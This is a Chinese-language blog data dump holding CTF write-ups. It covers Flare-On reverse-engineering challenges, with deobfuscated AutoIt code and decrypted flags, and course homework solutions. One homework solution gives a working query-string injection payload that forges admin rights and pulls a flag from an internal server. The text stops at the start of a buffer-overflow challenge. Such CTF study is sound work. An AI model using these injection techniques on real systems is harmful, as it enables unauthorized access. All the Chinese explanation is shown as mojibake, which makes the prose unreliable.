b&#x27;the kind of challenges we are gonna make here&#x27;cipher = open(&quot;Runtime.dll&quot;,&#x27;rb&#x27;).read()decryptor = AES.new(sha256(key).digest(),AES.MODE_CBC,iv=IV)f = decryptor.decrypt(cipher)with open(&quot;flag.png&quot;,&#x27;wb&#x27;) as flag: flag.write(b64decode(f)) 6 - codeitDescription Reverse engineer this little compiled script to figure out what you need to do to make it give you the flag (as a QR code). Solutionbinary æ˜¯ä¸€å€‹æœƒæŠŠè¼¸å…¥åšæˆ QRcode ä¹‹å¾Œç”¨åœ–ç‰‡å±•ç¤ºå‡ºä¾†ç¨‹å¼ï¼Œçœ‹èµ·ä¾†æ˜¯é€™æ¨£ è§€å¯Ÿä¸€ä¸‹ binary è£¡é¢çš„å­—ä¸²ä¸é›£ç™¼ç¾é€™æ˜¯ä¸€å€‹å¾ AutoIt ç·¨è­¯è€Œä¾†çš„ç¨‹å¼ï¼Œéš¨ä¾¿æ‰¾ä¸€ä¸‹å°±å¯ä»¥æ‰¾åˆ°å·¥å…· èƒ½å¤ åšåˆ° extract byte code è·Ÿ decompile byte codeï¼Œé€™è£¡æˆ‘æ˜¯ç”¨ AutoIt-Ripper ç¨‹å¼ç¢¼ç®—æ˜¯é‡åº¦æ··æ·†ï¼Œä¸éæœ€å¾Œçš„é‚è¼¯æ˜¯é€™æ¨£çš„ï¼Œä½¿ç”¨ Windows API GetComputerNameA å…ˆå–å¾—é›»è…¦åå­—ï¼Œç„¶å¾Œå°å…¶åš SHA-256 ä¹‹å¾Œå¯ä»¥å¾—åˆ°ä¸€å€‹ hashï¼Œä¹‹å¾Œç”¨åœ¨å°å‡ºçœŸçš„ QRcode ä¹‹å‰ï¼Œç¨‹å¼æœƒå…ˆå·å·ç”¨é€™å€‹ hash ç•¶ä½œ AES çš„ key ä¾†è§£å¯†ä¸€å€‹ cipherï¼Œå¦‚æœè§£å‡ºä¾†çš„èµ·é ­æ˜¯ FLARE ä¸”åŒæ™‚çµå°¾æ˜¯ ERALF æ™‚ï¼Œç¨‹å¼æœƒç›´æ¥æŠŠè§£å‡ºä¾†çš„æ±è¥¿ç•¶ä½œ QRcode ç”¨åœ–ç‰‡å±•ç¤ºå‡ºä¾†ï¼Œå¦å‰‡å°±å±•ç¤ºæœ¬ä¾†çš„è¼¸å…¥æ‰€å°æ‡‰çš„ QRcodeï¼Œä¹Ÿå°±æ˜¯èªªæˆ‘å€‘è¦æ‰¾åˆ°æ­£ç¢ºçš„ ComputerNameã€‚ åœ¨ 227 è¡Œé™„è¿‘å¯ä»¥çœ‹åˆ°ä¸€äº› bitwise çš„æ“ä½œï¼ˆ function æˆ‘é‡å‘½åéäº†ï¼‰ï¼š script.au3 227228229230231232233234235236237238239240241242243244245246247248249250251252253FUNC readSpriteBmp ( BYREF $computerName ) LOCAL $FLQVIZHEZM = InstallFile ( 14 ) LOCAL $FLFWEZDBYC = createFile ( $FLQVIZHEZM ) IF $FLFWEZDBYC &lt;&gt; - $FLTGQYKODM THEN LOCAL $FLVBURIUYD = _GetFileSize_ ( $FLFWEZDBYC ) IF $FLVBURIUYD &lt;&gt; - $FLTMXODMFL AND DLLSTRUCTGETSIZE ( $computerName ) &lt; $FLVBURIUYD - 54 THEN LOCAL $FLNFUFVECT = DLLSTRUCTCREATE (_Hex2Str_( &#x27;struct;byte[&#x27; &amp; &#x27;269156&#x27; &amp; &#x27;];endstruct&#x27;) LOCAL $FLSKUANQBG = ReadFile ( $FLFWEZDBYC , $FLNFUFVECT ) IF $FLSKUANQBG &lt;&gt; - $FLVUJARIHO THEN LOCAL $FLXMDCHRQD = DLLSTRUCTCREATE ( &#x27;struct;byte[54];byte[&#x27; &amp; $FLVBURIUYD - 54 &amp; &#x27;];endstruct&#x27;, DLLSTRUCTGETPTR ( $FLNFUFVECT ) ) LOCAL $FLQGWNZJZC = 1 LOCAL $FLOCTXPGQH = &#x27;&#x27; FOR $FLTERGXSKH = 1 TO DLLSTRUCTGETSIZE ( $computerName ) LOCAL $FLYDTVGPNC = NUMBER ( DLLSTRUCTGETDATA ( $computerName , 1 , $FLTERGXSKH ) ) FOR $FLTAJBYKXX = 6 TO 0 STEP -1 $FLYDTVGPNC += BITSHIFT ( BITAND ( NUMBER ( DLLSTRUCTGETDATA ( $FLXMDCHRQD , 2 , $FLQGWNZJZC ) ) , 1 ) , -1 * $FLTAJBYKXX ) $FLQGWNZJZC += 1 NEXT $FLOCTXPGQH &amp;= CHR ( BITSHIFT ( $FLYDTVGPNC ,1) + BITSHIFT ( BITAND ( $FLYDTVGPNC ,1) , -7 ) ) NEXT DLLSTRUCTSETDATA ( $computerName , 1 , $FLOCTXPGQH ) ENDIF ENDIF CloseHandle ( $FLFWEZDBYC ) ENDIF DeleteFileA ( $FLQVIZHEZM )ENDFUNC ä»–åšçš„äº‹æƒ…å°±æ˜¯æŠŠä¸€é–‹å§‹çœ‹åˆ°çš„é‚£å€‹åœ¨æ•²éµç›¤çš„ flare icon çš„æ¯ 7bits çµ„èµ·ä¾†ï¼Œé€™è½èµ·ä¾†å°±æ˜¯ ASCIIï¼Œæ‰€ä»¥å¦‚æœæˆ‘å€‘ç…§åšçš„è©±å°±å¯ä»¥æŠ½å‡ºé€™æ®µå­— aut01tfan1999 é€™å°±æ˜¯æ­£ç¢ºçš„é›»è…¦åç¨±ï¼Œæœ€å¾Œå°±æ˜¯çœ‹è¦ç›´æ¥æ”¹ ComputerName é‚„æ˜¯ Hook Functionï¼Œæˆ–æ˜¯ç›´æ¥è§£å¯†éƒ½è¡Œã€‚ Flag: L00ks_L1k3_Y0u_D1dnt_Run_Aut0_Tim3_0n_Th1s_0ne!@flare-on.com ä¸‹é¢çš„é¡Œç›®å¿˜è¨˜æˆªåœ–â€¦ï¼Œé›–ç„¶éƒ½è¨˜å¾—å¾ˆæ¸…æ¥šï¼Œä½†æ˜¯æ‡¶å¾—å¯«ã„Œï¼Œæˆ‘å°±å¯«å€‹å¤§æ¦‚å°±å¥½äº†ï¼Œåæ­£æœ‰å®˜æ–¹ writeupï¼Œ2ã„2ã„ã€‚ 7 - re_crowdæœƒæ‹¿åˆ°ä¸€å€‹ pcap æª”æ¡ˆï¼Œå¯¦éš›ä¸Šæ˜¯æ”»æ“Šè€…åœ¨ç”¨ CVE æ”»æ“Šä¼ºæœå™¨ä¸¦ä¸”å·æª”æ¡ˆï¼Œè£é¢åŒ…å« alphanumeric unicode shellcode æŠŠå®ƒå€’å‡ºä¾†åˆ†æçœ‹æ‡‚å°±å¥½äº†ï¼Œè§£å®Œ RC4 å°±å¯ä»¥å¾—åˆ° flagã€‚ 8 - Aardvarké€™æ”¯ç¨‹å¼åˆ©ç”¨ wsl å«èµ·ä¸€å€‹ ELF åŸ·è¡Œæª”ï¼ˆæ”¾åœ¨ PE resource è£é¢ï¼‰ï¼Œä¹‹å¾Œç”¨ UNIX Socket æºé€šä¾†ç© OOXXï¼ˆTic-tac-toeï¼‰ çš„éŠæˆ²ï¼Œç”±æ–¼ Tic-tac-toe åœ¨ç©å®¶éƒ½ä¸‹æœ€ä½³ä½ç½®æ™‚æ˜¯å¿…å®šå¹³æ‰‹çš„éŠæˆ²ï¼Œè§£æ³•å°±æ˜¯æŠŠ ELF è£é¢åˆå§‹åŒ–éŠæˆ²ç›¤é¢çš„åœ°æ–¹æ”¹æˆé å…ˆæ”¾ä¸€å † O é€™æ¨£å°±å¿…å‹äº†ã€‚ 9 - crackinstallercrackinstaller æœƒå…ˆå®‰è£ä¸€å€‹æœ‰ç°½ç« ä¸”èƒ½ç¹é SMEP çš„ driver ä¹‹å¾Œé€éé€™å€‹ driver å®‰è£ä¸€å€‹æ²’æœ‰ç°½ç« çš„ driverï¼Œç›®æ¨™æ˜¯è¦åœ¨ç™»éŒ„æª”è£¡é¢å¯«ä¸Šæ­£ç¢ºçš„å¯†ç¢¼ç„¶å¾Œå¯«ä¸€å€‹ COM çš„ Client è·Ÿ crackinstaller å®‰è£çš„ COM åšäº’å‹•ï¼Œæœ€å¾Œå°±å¯ä»¥æ‹¿åˆ° flagã€‚ æ¯”è¼ƒæœ‰è¶£çš„é»æ˜¯ã€Œä¸€å€‹æœ‰ç°½ç« ä¸”èƒ½ç¹é SMEP çš„ driver ã€ï¼Œä¸€é–‹å§‹æˆ‘è§£å®Œé¡Œç›®å¾Œä¸€ç›´è¦ºå¾—è£¡é¢çš„ magic number æ„Ÿè¦ºå¯ä»¥ç›´æ¥æŸ¥åˆ°ï¼Œæä¸å¥½æˆ‘ä¸ç”¨èŠ±é€™éº¼å¤šæ™‚é–“é€†å‘ï¼Œçµæœç™¼ç¾é€™æ±è¥¿æ ¹æœ¬å°±æ˜¯å¡æ™®ç©ºçš„æ±è¥¿ï¼ŒPC ç‰ˆçš„ Street Fighter V çš„ driver è€Œä¸”ä»–å”¯ä¸€çš„åŠŸèƒ½å°±æ˜¯æŠŠ SMEP é—œæ‰ç„¶å¾Œè·³ä¸Š userland åŸ·è¡Œä»»æ„ç¨‹å¼ï¼Œå¤©å•Šå¡æ™®ç©ºâ€¦ 10 - breakç°¡å–®ä¾†èªªå°±æ˜¯åŸ·è¡Œä¸»è¦ç¨‹å¼å¾Œï¼Œä¸»è¦ç¨‹å¼æœƒ fork B ä¾† debug è‡ªå·±ï¼ŒB æœƒ fork C ä¾† debug è‡ªå·±ï¼Œé‚è¼¯éƒ½è¢«å¾€ä¸‹å¤–åŒ…ï¼Œå› ç‚º C å¾ˆç°¡å–®ï¼Œæ‰€ä»¥å¯ä»¥æŠŠé‚£äº›åŠŸèƒ½éƒ½ patch å› Bï¼Œé€™æ¨£å°±å¯ä»¥ç”¨ gdb è·Ÿ B åœ¨åšä»€éº¼äº†ï¼Œå°±é†¬å­ï¼Œå¾Œé¢å°±æƒ³è¾¦æ³•æä¸€æå°±æœƒæœ‰ flag äº†ã€‚ 11 - rabbitholeéå¸¸æƒ¡åŠ£ï¼Œæ¥µç›¡æˆ‘é€šéˆä¹‹èƒ½æŠŠå…¨éƒ¨çš„æ¨£æœ¬éƒ½çœ‹å®Œäº†ï¼Œä½†å…¶å¯¦ä¸ç”¨çœ‹ 32bit é‚£ä¸€éƒ¨åˆ†çš„ 1x å€‹ payloadï¼Œç¸½ä¹‹è£¡é¢çš„ PE æª”æ¡ˆéƒ½è¢« PX é€™å€‹ç®—æ³•çµ¦åŒ…èµ·ä¾†äº†ï¼Œé¦–å…ˆè¦å…ˆå¯«è…³æœ¬æŠŠä»–å€‘å¥½å¥½è§£é–‹ï¼Œç„¶å¾Œå°±å¯ä»¥çœ‹æ‡‚ dll ä¹‹é–“äº’ç›¸å‘¼å«ï¼Œè¢«åŠ å¯†çš„ flag åœ¨ DiMap é€™å€‹ç™»éŒ„æª”è£¡é¢ï¼Œè§£é–‹å°±æ˜¯äº†ã€‚","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"Flare-On","slug":"Flare-On","permalink":"http://blog.terrynini.tw/tags/Flare-On/"}]},{"title":"2020::ç¨‹å¼å®‰å…¨::HW0 Write-up","slug":"2020-ç¨‹å¼å®‰å…¨-HW0-Write-up","date":"2020-09-25T00:00:00.000Z","updated":"2024-06-20T16:45:57.084Z","comments":true,"path":"tw/2020-ç¨‹å¼å®‰å…¨-HW0-Write-up/","permalink":"http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/","excerpt":"æ—©å®‰æ˜¯æˆ‘æ‹‰à¸…(&#x3D;Ë‡Ï‰Ë‡&#x3D;)à¸…ï¼Œä»Šå¹´åˆæ˜¯åŠ©æ•™æ‹‰ï¼Œé¨™å€‹æµé‡ï¼Œæ„Ÿæ©ã€‚","text":"æ—©å®‰æ˜¯æˆ‘æ‹‰à¸…(&#x3D;Ë‡Ï‰Ë‡&#x3D;)à¸…ï¼Œä»Šå¹´åˆæ˜¯åŠ©æ•™æ‹‰ï¼Œé¨™å€‹æµé‡ï¼Œæ„Ÿæ©ã€‚ Eekum BokumReconé¦–å…ˆå¯ä»¥å…ˆè·Ÿç¨‹å¼äº’å‹•ä¸€ä¸‹æŒæ¡åŠŸèƒ½ï¼Œç¸½ä¹‹çœ‹èµ·ä¾†æ˜¯ä¸€å€‹ n-puzzle gameï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œé€™å€‹éŠæˆ²çš„ 16 å€‹æ–¹å¡Šç¸½å…±å¯ä»¥çµ„æˆ $16!$ å€‹é–‹å±€ï¼ˆå¯å‹•å¡Šä¸ä¸€å®šè¦åœ¨å³ä¸‹ï¼‰ï¼Œå…¶ä¸­æ´½æœ‰ä¸€åŠç„¡è§£ï¼Œå› ç‚ºæˆ‘å€‘éŠæˆ²éç¨‹ä¸­åªèƒ½ä½¿ç”¨ä¸Šä¸‹å·¦å³ï¼Œçµ„åˆå‡ºä¾†çš„æ˜¯ä¸€å€‹äº¤éŒ¯ç¾¤ï¼Œä½†é€™å€‹èµ·å§‹ç›¤é¢ 16 è™Ÿåœ¨å³ä¸‹ä¸”åªæœ‰ä¸€æ¬¡ç½®æ›ï¼Œä¸å¯èƒ½æœ‰è§£ï¼Œæ‰€ä»¥åˆ¥ç©äº†ï¼Œå¥½å¥½é€†å‘å¥½ã„‡ï¼š ç¸½ä¹‹å…ˆå˜—è©¦ file å®ƒï¼Œå¯ä»¥ç™¼ç¾ä»–æ˜¯ .Net assemblyï¼š $file EekumBokum.exeEekumBokum.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows .Net è·Ÿ JVM é¡ä¼¼ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯ä¸€å€‹åŸ·è¡Œ bytecode çš„ç’°å¢ƒï¼Œbytecode çš„å¥½è™•é™¤äº†æ–¹ä¾¿ç§»æ¤åˆ°å„å€‹å¹³å°å¤–ï¼Œé‚„éå¸¸å¥½é€†å‘(?)ï¼Œé€™è£¡å¯ä»¥ç”¨ dnSpy ä¾†å¹«åŠ©è§£é¡Œï¼ŒåŒ¯å…¥å¾Œé•·é€™æ¨£ï¼š ç¸½ä¹‹ Program æ˜¯ç¨‹å¼çš„å…¥å£é»ï¼Œä»–æœƒå«èµ· Form1 ä¹Ÿå°±æ˜¯æˆ‘å€‘æ‰€çœ‹åˆ°çš„ä»‹é¢ï¼Œç›´æ¥æ‰“é–‹ä¾†çœ‹ï¼Œå¯ä»¥çœ‹å¾—åˆ°å»ºæ§‹å¼æ‡‰è©²æ˜¯åœ¨æ’éŠæˆ²ç›¤é¢ï¼š 171819202122232425262728293031323334353637383940414243444546474849public Form1()&#123; this.InitializeComponent(); this.idxMovable = 15; this.originalPicture.AddRange(new Bitmap[] &#123; Resources.EekumBokum_1, Resources.EekumBokum_2, Resources.EekumBokum_3, Resources.EekumBokum_4, Resources.EekumBokum_5, Resources.EekumBokum_6, Resources.EekumBokum_7, Resources.EekumBokum_8, Resources.EekumBokum_9, Resources.EekumBokum_10, Resources.EekumBokum_11, Resources.EekumBokum_12, Resources.EekumBokum_13, Resources.EekumBokum_14, Resources.EekumBokum_15, Resources.EekumBokum_16 &#125;); List&lt;PictureBox&gt; listPitctureOrderedByName = (from PictureBox c in this.groupBox1.Controls orderby Regex.Replace(c.Name, &quot;\\\\d+&quot;, (Match n) =&gt; n.Value.PadLeft(4, &#x27;0&#x27;)) select c).ToList&lt;PictureBox&gt;(); for (int i = 0; i &lt; 16; i++) &#123; listPitctureOrderedByName[i].Image = this.originalPicture[i]; &#125; listPitctureOrderedByName[13].Image = this.originalPicture[14]; listPitctureOrderedByName[14].Image = this.originalPicture[13];&#125; ç¹¼çºŒå¾€ä¸‹çœ‹å¯ä»¥ç™¼ç¾ samonCheck é€™å€‹ methodï¼Œå¯ä»¥ç™¼ç¾åœ¨ method çš„æœ€å¾Œæœƒç”Ÿæˆä¸€å€‹è·Ÿ flag ç›¸é—œçš„è¦–çª—ï¼Œmethod çš„ä¸­æ®µåšäº†ä¸€äº›ä¸å¯æè¿°çš„æ“ä½œï¼Œçœ‹èµ·ä¾†æ˜¯è§£å¯†ï¼Œä¸éä¸éœ€è¦æ€¥è‘—çœ‹æ‡‚å®ƒï¼Œå› ç‚ºé¡¯ç„¶æ˜¯å¯ä»¥ç¹éçš„ï¼š 525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100private void samonCheck(List&lt;PictureBox&gt; listPitcture)&#123; List&lt;byte&gt; pwdl = new List&lt;byte&gt;(); for (int p = 0; p &lt; 16; p++) &#123; pwdl.Add(((Bitmap)listPitcture[p].Image).GetPixel(66, 99).R); if (!listPitcture[p].Image.Equals(this.originalPicture[p])) &#123; return; &#125; &#125; // è§£å¯†é–‹å§‹ byte[] data = new byte[]&#123;250,241,107,182,244,110,21,129,17,240,155,200,111,111,225,110,180,224,156,194,29,106,141,216,99,58,59,191,45,227,184,221,63,139,223,232,129,201,121,62,164,113,247,230,67,108,182,231&#125;; byte[] pwd = pwdl.ToArray(); int[] key = new int[256]; int[] box = new int[256]; byte[] cipher = new byte[data.Length]; int i; for (i = 0; i &lt; 256; i++) &#123; key[i] = (int)pwd[i % pwd.Length]; box[i] = i; &#125; int j; for (i = (j = 0); i &lt; 256; i++) &#123; j = (j + box[i] + key[i]) % 256; int tmp = box[i]; box[i] = box[j]; box[j] = tmp; &#125; int a; j = (a = (i = 0)); while (i &lt; data.Length) &#123; a++; a %= 256; j += box[a]; j %= 256; int tmp = box[a]; box[a] = box[j]; box[j] = tmp; int k = box[(box[a] + box[j]) % 256]; cipher[i] = (byte)((int)data[i] ^ k); i++; &#125; //è§£å¯†çµæŸ MessageBox.Show(&quot;this is your flag\\n&quot; + Encoding.ASCII.GetString(cipher));&#125; é—œéµçš„ç¨‹å¼ç¢¼åœ¨ 54 è¡Œé–‹å§‹çš„åœ°æ–¹ï¼Œå‡è¨­ç•¶å‰éŠæˆ²ç›¤é¢å€‹å…ƒç´ éƒ½è·ŸoriginalPictureä¸€æ¨£çš„è©±ï¼Œå°±æŠŠæ¯å€‹æ–¹å¡Šä¸­çš„åœ–ç‰‡ä½æ–¼åº§æ¨™ (66.99) çš„ pixel æ‹¿å‡ºä¾†ï¼Œåšç‚ºå¾ŒåŠæ®µè§£å¯† flag çš„ keyï¼š 545556575859606162List&lt;byte&gt; pwdl = new List&lt;byte&gt;();for (int p = 0; p &lt; 16; p++)&#123; pwdl.Add(((Bitmap)listPitcture[p].Image).GetPixel(66, 99).R); if (!listPitcture[p].Image.Equals(this.originalPicture[p])) &#123; return; &#125;&#125; é€™è£¡ç›´è¦ºçš„ä½œæ³•æ‡‰è©²å°±æ˜¯æŠŠåœ–ç‰‡æŠ½å‡ºä¾†ï¼Œæ‹¿å‡ºå°æ‡‰åº§æ¨™çš„ pixelï¼Œç„¶å¾Œè§£å¯†ï¼Œä½†ç”±æ–¼ .Net éå¸¸å¥½é‚„åŸï¼ŒdnSpy é‚„åŸå‡ºä¾†çš„ code åŸºæœ¬ä¸Šè·Ÿ source code æ²’å·®åˆ¥ï¼Œæ‰€ä»¥æˆ‘å€‘å…¶å¯¦å¯ä»¥é‡æ–° compile ä»–å°±å¥½äº†ï¼Œåœ¨ Form1 çš„å»ºæ§‹å­ä¸Šé¢é» Edit Methodï¼š ç›´æ¥è®“éŠæˆ²é–‹å±€çš„ç›¤é¢è®Šæˆèµ°ä¸€æ­¥å¯è§£å°±å¥½äº†ï¼Œç›´æ¥ä¿®æ”¹å»ºæ§‹å­ç„¶å¾Œé» Compileï¼Œä¹‹å¾Œå­˜æª”å°±å¥½äº†ï¼š listPitctureOrderedByName[13].Image = this.originalPicture[14];listPitctureOrderedByName[14].Image = this.originalPicture[13];//æŠŠä¸Šé¢å…©è¡Œæ”¹æˆä¸‹é¢å…©è¡ŒlistPitctureOrderedByName[14].Image = this.originalPicture[15];listPitctureOrderedByName[15].Image = this.originalPicture[14]; Exploit (or just move)é‡æ–°åŸ·è¡Œä¿®æ”¹éå¾Œå®Œæˆ compile çš„ç¨‹å¼ï¼š (æŒ‰ä¸€ä¸‹å·¦éµ) flag: flag&#123;NANI_KORE?(=.=)EEKUM_BOKUM(=^=)EEKUM_BOKUM&#125; owoHubReconé¡Œç›®çš„ä»‹é¢å¾ˆç°¡å–®ï¼Œå¯ä»¥è¼¸å…¥ username è·Ÿé¸æ“‡ I am cute&#x2F;not cuteï¼Œç°¡å–®è·Ÿé¡Œç›®äº’å‹•ä¾†æŒæ¡ä¸€ä¸‹æœ‰ä»€éº¼åŠŸèƒ½ã€‚ å¦‚æœå‹¾é¸ I am not cuteï¼Œç¶²ç«™æœƒé¡¯ç¤ºä¸€å † Stop é€™è£¡çš„ I am cute æ²’è¾¦æ³•é¸æ“‡ï¼Œä½†é€™åªæ˜¯ html tag è€Œå·²ï¼Œæœ€å¿«çš„æ–¹æ³•å°±æ˜¯ç”¨é–‹ç™¼è€…å·¥å…·æ‹”æ‰ attribute ç›´æ¥æ‹¿æ‰ï¼Œä¹‹å¾Œå°±èƒ½å‹¾é¸äº† é€²ä¾†å¾Œæœ‰ä¸€å †å¯æ„›å°å‰ï¼Œé›–ç„¶å°æ–¼æˆ‘ä¾†èªªæ¯” flag è®šå¤šäº†ï¼Œä½†é‚„æ˜¯éµå¾ªä¸–ä¿—çš„åƒ¹å€¼ï¼Œç¹¼çºŒå°‹æ‰¾ flag æ¥ä¸‹ä¾†çœ‹ä¸€ä¸‹é¡Œç›®æä¾›çš„ source code çœ‹çœ‹æœ‰æ²’æœ‰æœ‰è¶£çš„è³‡è¨Šï¼ˆå‚™ä»½)ï¼Œå¾å‰å¹¾è¡ŒçŸ¥é“é€™æ˜¯ç”¨ express å¯«çš„ç¶²ç«™ï¼ˆå¯«é€™ç¨®é¡Œç›®å¡ä½çš„è©±ï¼Œå°±ä¸è¦ä¸€ç›´çœ‹è¢å¹•äº†ï¼Œæ¶ä¸€å€‹ä¸€æ¨£çš„æœå‹™æˆ³æˆ³çœ‹ï¼‰ï¼Œè€Œä¸” authServer æœ‰æˆ‘å€‘æƒ³è¦çš„ flagï¼Œä½†å¾ 12 è¡Œå¯ä»¥çŸ¥é“é€™å€‹ server åªæ¥å— local çš„é€£ç·šï¼Œæˆ‘å€‘åªèƒ½é–“æ¥è·Ÿä»–äº’å‹•ï¼Œä¸éç¾åœ¨çŸ¥é“è¦æ‹¿åˆ° flag çš„æ¢ä»¶æ˜¯æˆç‚º admin è€Œä¸” givemeflag === &quot;yes&quot; 123456789101112authServer.get(&quot;/&quot;, (request, response) =&gt; &#123; const &#123; data, givemeflag &#125; = request.query; const userInfo = JSON.parse(data); if (givemeflag === &quot;yes&quot; &amp;&amp; userInfo.admin) // You don&#x27;t need to be cute to get the flag ouo! response.send(FLAG); else response.send(&#123; username: `Hellowo, $&#123;userInfo.username&#125;$&#123;userInfo.admin ? &quot;&lt;(_ _)&gt;&quot; : &quot;&quot;&#125;!`, imageLinks: cuteOnlyImages.map(link =&gt; userInfo.cute ? link : &quot;javascript:alert(&#x27;u are not cute oAo!&#x27;)&quot;) &#125;);&#125;);authServer.listen(9487, &quot;127.0.0.1&quot;); å¾€ä¸Šçœ‹ä¸€ä¸‹å¦‚ä½•æˆç‚º adminï¼Œé¦–å…ˆåœ¨ 4~8 è¡Œå¯ä»¥çœ‹åˆ° username è·Ÿ cute æœ‰å‹åˆ¥è·Ÿå…§å®¹çš„é™åˆ¶ï¼Œ10~13 è¡Œé™åˆ¶ username åªèƒ½ä½¿ç”¨ alphanumericï¼Œ15~17 è¡Œæœƒç›´æ¥æŠŠ username åŠ cute ä¸åšå…¶ä»–è™•ç†ç›´æ¥æ”¾é€² URL è£¡é¢ï¼Œè€Œä¸”åœ¨æ­£å¸¸æƒ…æ³ä¸‹ givemeflag æ°¸é ä¸å¯èƒ½æ˜¯ yesï¼ŒæŒæ¡äº† source è·Ÿ sinkï¼Œé€™è£é¡¯ç„¶æ˜¯è¦æ±¡æŸ“ 17 è¡Œçš„ URLï¼Œè®“ app å» authServer æŠŠ flag æ‹¿å›ä¾†ï¼š 1234567891011121314151617181920212223242526app.get(&#x27;/auth&#x27;, (request, response) =&gt; &#123; const &#123; username, cute &#125; = request.query; if (typeof username !== &quot;string&quot; || typeof cute !== &quot;string&quot; || username === &quot;&quot; || !cute.match(&quot;(true|false)$&quot;)) &#123; response.send(&#123; error: &quot;Whaaaat owo?&quot; &#125;); return; &#125; if (username.match(/[^a-z0-9]+/i)) &#123; response.send(&#123; error: &quot;`Username` should contain only letters &amp; numbers, owo.&quot; &#125;); return; &#125; const userInfo = `&#123;&quot;username&quot;:&quot;$&#123;username&#125;&quot;,&quot;admin&quot;:false,&quot;cute&quot;:$&#123;cute&#125;&#125;`; const api = `http://127.0.0.1:9487/?data=$&#123;userInfo&#125;&amp;givemeflag=no`; http.get(api, resp =&gt; &#123; resp.setEncoding(&quot;utf-8&quot;); if (resp.statusCode === 200) resp.on(&#x27;data&#x27;, data =&gt; response.send(data)); else response.send(&#123; error: &quot;qwq...&quot; &#125;); &#125;);&#125;)app.listen(8787, &quot;0.0.0.0&quot;); Exploité¦–å…ˆå·²ç¶“çŸ¥é“ username åªèƒ½æ”¾ alphanumericï¼Œé€™ä¸€å€‹ regex çœ‹èµ·ä¾†æ²’å•é¡Œï¼Œæ©Ÿæœƒä¸å¤§ï¼Œå¦å¤–ä¸€å€‹è¼¸å…¥å°±æ˜¯ cuteï¼Œæ ¹æ“šå‰›å‰› source code çš„çµæœå¯ä»¥çŸ¥é“è¼¸å…¥åªèƒ½æ˜¯ â€œtrueâ€ æˆ–æ˜¯ â€œfalseâ€ï¼Œä½† javascript çš„ match æ˜¯åœ¨ String æ‰¾åˆ°ç¬¦åˆ pattern çš„å­å­—ä¸²ï¼Œæ‰€ä»¥ç…§ source code çš„å¯«æ³•ï¼Œåªè¦èƒ½å¤ åœ¨å­—ä¸²å°¾ç«¯æ‰¾å¾—åˆ° â€œtrueâ€ æˆ–æ˜¯ â€œfalseâ€ å°±å¥½äº†ï¼Œä¾‹å¦‚ &quot;this is not true&quot;.match(&quot;(true|false)$&quot;) !== nulltrue&quot;this is false&quot;.match(&quot;(true|false)$&quot;) !== nulltrue//æ­£ç¢ºæ‡‰è©²æ˜¯é€™æ¢&quot;true is false, false is true&quot;.match(&quot;^(true|false)$&quot;) === nulltrue æ‰€ä»¥ cute æ˜¯å¯ä»¥æ³¨å…¥çš„ï¼Œå¯ä»¥å…ˆé€éé€™å€‹æ–¹æ³•æ‹¿åˆ° adminï¼Œå¦‚æœæˆ‘å€‘çš„ cute å¡«å…¥ true,&quot;admin&quot;:true&#125;&amp;a=&#123;trueï¼Œé‚£ userinfo å°±æœƒè¢«æˆ‘å€‘æ”¹æˆ &#123;&quot;username&quot;:&quot;nini&quot;,&quot;admin&quot;:false,&quot;cute&quot;:true,&quot;admin&quot;:true&#125;&amp;a=&#123;true&#125;//æœ€å¾Œè¢«è¨ªå•çš„ URL ä¹Ÿå°±è®Šæˆ//http://127.0.0.1:9487/?data=&#123;&quot;username&quot;:&quot;nini&quot;,&quot;admin&quot;:false,&quot;cute&quot;:true,&quot;admin&quot;:true&#125;&amp;a=&#123;true&#125;&amp;givemeflag=no é€™è£¡çš„ &amp;a çš„ &amp; è¦å…ˆé€²è¡Œä¸€æ¬¡ urlencode ä¸ç„¶æœƒè¢« app.get(&#39;/auth&#39; ç›´æ¥æ‹¿ä¾†ç”¨ï¼Œè¨ªå• https://owohub.zoolab.org/auth?username=nini&cute=true,%22admin%22:true}%26a={trueï¼Œå°±èƒ½æˆåŠŸè®Šæˆ admin äº†ï¼š ä¸‹ä¸€å€‹å•é¡Œæ˜¯è¦æ€éº¼æŠŠ givemeflag æ”¹æˆ â€œyesâ€ï¼Œå†ç™¼èµ·è«‹æ±‚çš„æ™‚çµ¦äºˆå¤šå€‹åŒåçš„ GET parametersï¼Œserver æœƒå–æœ€å¾Œä¸€å€‹ï¼Œæˆ‘å€‘æ³¨å…¥çš„é»åœ¨ givemeflag=no ä¹‹å‰ï¼Œæ‰€ä»¥æ²’è¾¦æ³•ç›´æ¥è“‹æ‰ï¼Œé€™è£¡å¯ä»¥ç”¨ pound sign ä¾†æŠŠå¾ŒåŠæ®µçš„ GET parameter ç›´æ¥è®Šæˆ URL çš„ anchorï¼Œå¾—åˆ°æœ€å¾Œçš„ cute true,&quot;admin&quot;:true&#125;&amp;givemeflag=yes#true//æœ€å¾Œè¢«è¨ªå•çš„ URL ä¹Ÿå°±è®Šæˆ//http://127.0.0.1:9487/?data=&#123;&quot;username&quot;:&quot;nini&quot;,&quot;admin&quot;:false,&quot;cute&quot;:true,&quot;admin&quot;:true&#125;&amp;givemeflag=yes#true&#125;&amp;givemeflag=no ä¸€æ¨£ &amp; è·Ÿ # è¦å…ˆ urlencodeï¼Œæœ€å¾Œçš„ payload :https://owohub.zoolab.org/auth?username=nini&cute=true,%22admin%22:true}%26givemeflag=yes%23true flag: FLAG&#123;owo_ch1wawa_15_th3_b35t_uwu!!!&#125; CafeOverflowReconå¯ä»¥å…ˆ nc è·Ÿ remote æœå‹™äº’å‹•ä¸€ä¸‹ï¼Œçœ‹èµ·ä¾†æ˜¯å¾ˆç°¡å–®çš„ç¨‹å¼: $ nc hw00.zoolab.org 65534What is your name : niniHello, nini å¯ä»¥è©¦è©¦çœ‹å¡é•·ä¸€é»çš„åå­—ï¼Œç„¶å¾Œä»–å°± crash 